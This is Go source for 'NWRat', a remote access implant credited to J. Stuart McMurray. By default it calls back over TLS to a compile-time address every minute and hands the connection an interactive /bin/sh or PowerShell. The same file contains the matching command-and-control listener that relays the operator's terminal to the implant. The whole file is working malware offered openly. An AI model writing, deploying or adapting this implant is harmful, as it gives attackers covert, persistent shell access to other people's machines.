// Program NWRat is a simple implant
package main

/*
 * nwrat.go
 * Rat which calls back over TLS
 * By J. Stuart McMurray
 * Created 20200720
 * Last Modified 20200720
 */

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"time"
)

/* Implant settings.  These may be set at compile-time. */
var (
	callbackInterval = "1m"
	callbackAddr     = "example.com:443"

	implantDebug = "" /* Not empty for verbose implant messages */
)

func main() {
	var (
		listen = flag.String(
			"listen",
			"",
			"Callback-catching listen `address`",
		)
		cert = flag.String(
			"cert",
			"cert.pem",
			"TLS `certificate` for use with -listen",
		)
		key = flag.String(
			"key",
			"key.pem",
			"TLS `key` for use with -listen",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [-listen address [options]]
			
With no arguments, functions as an implant and attempts to make a TLS
connection to the configured domain and port every so often.

With -listen, listens for a connection from the implant.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	if "" != *listen {
		doC2(*listen, *cert, *key)
	} else {
		doImplant()
	}
}

/* debug prints a printfish message if implantDebug is not the empty string */
func debugf(f string, a ...interface{}) {
	if "" != implantDebug {
		log.Printf(f, a...)
	}
}

/* doImplant attempts to connect back to the configured address every so often
and if it gets a connection starts a shell. */
func doImplant() {
	/* Parse the callback interval */
	st, err := time.ParseDuration(callbackInterval)
	if nil != err {
		/* You did test it, right? */
		panic(err)
	}

	/* Make sure we have a host and port */
	h, p, err := net.SplitHostPort(callbackAddr)
	if "" == h || "" == p {
		/* You did test it, right? */
		log.Fatalf("Invalid callback address %s", callbackAddr)
	}
	if nil != err {
		panic(err)
	}

	/* TLS Config */
	conf := &tls.Config{
		ServerName: h,
	}

	/* Try to call back every so often */
	for {
		go tryImplant(conf)
		time.Sleep(st)
	}
}

/* tryImplant tries to connect back and spawn a shell */
func tryImplant(conf *tls.Config) {
	/* Try to connect back. */
	c, err := tls.Dial("tcp", callbackAddr, conf)
	if nil != err {
		debugf("Dial: %s", err)
		return
	}
	defer c.Close()

	/* Upgrade to a shell */
	var s *exec.Cmd
	switch os := runtime.GOOS; os {
	case "linux":
		s = exec.Command("/bin/sh", "-p")

	case "windows":
		s = exec.Command("powershell.exe")
	}

	s.Stdin = c
	s.Stdout = c
	s.Stderr = c
	if err := s.Run(); nil != err {
		debugf("Shell: %s", err)
	}
}

/* doC2 listens for the implant */
func doC2(addr, certFile, keyFile string) {
	/* Set up the TLS config */
	var config tls.Config
	config.Certificates = make([]tls.Certificate, 1)
	var err error
	config.Certificates[0], err = tls.LoadX509KeyPair(certFile, keyFile)
	if nil != err {
		log.Fatalf(
			"Loading TLS cert and key from %s and %s: %s",
			certFile,
			keyFile,
			err,
		)
	}

	/* Get a connection */
	l, err := tls.Listen("tcp", addr, &config)
	if nil != err {
		log.Fatalf("Listening on %s: %s", addr, err)
	}
	log.Printf("Listening on %s", l.Addr())
	c, err := l.Accept()
	if nil != err {
		log.Fatalf("Accepting a connection to %s: %s", l.Addr(), err)
	}
	start := time.Now()
	l.Close()
	defer c.Close()
	log.Printf("Connection %s -> %s", c.RemoteAddr(), c.LocalAddr())

	/* Proxy stdio */
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		n, err := io.Copy(c, os.Stdin)
		if nil != err {
			log.Printf(
				"Error after sending %d bytes to implant: %s",
				n,
				err,
			)
		} else {
			log.Printf("Sent %d bytes to implant", n)
		}
	}()
	go func() {
		defer wg.Done()
		n, err := io.Copy(os.Stdout, c)
		if nil != err {
			log.Printf(
				"Error after receiving %d bytes from "+
					"implant: %s",
				n,
				err,
			)
		} else {
			log.Printf("Received %d bytes from implant", n)
		}
	}()

	wg.Wait()
	log.Printf(
		"Connection terminated after %s",
		time.Since(start).Round(time.Millisecond),
	)
}
